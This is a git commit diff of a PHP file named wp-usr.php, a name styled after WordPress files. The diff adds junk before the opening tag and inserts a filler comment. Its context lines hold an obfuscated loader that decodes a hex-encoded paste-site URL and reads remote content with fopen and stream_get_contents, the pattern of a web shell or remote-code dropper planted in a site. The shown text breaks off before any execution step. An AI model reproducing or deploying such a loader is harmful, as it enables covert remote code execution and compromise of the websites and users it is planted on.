c9f2bd1e99ac32b81b580e74c83f33fda526c80e
unamexid <155900225+unamexid@users.noreply.github.com>
2024-06-17 00:40:05 +0630

    Add files via upload

--- x/wp-usr.php
+++ x/wp-usr.php
@@ -1,5 +1,5 @@
-<?pHp
-
+A01<?pHp
+/* AAAAAAAAAAAAAAAAAAA */
 @clearstatcache();
 $XNlsK47az0 = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%2e%6d%79%63%6f%6e%61%6e%2e%6e%65%74%2f%34%39%37%33%34%37%2e%74%78%74'), 'r');
 $DdJHaBoYl6 = stream_get_contents($XNlsK47az0);
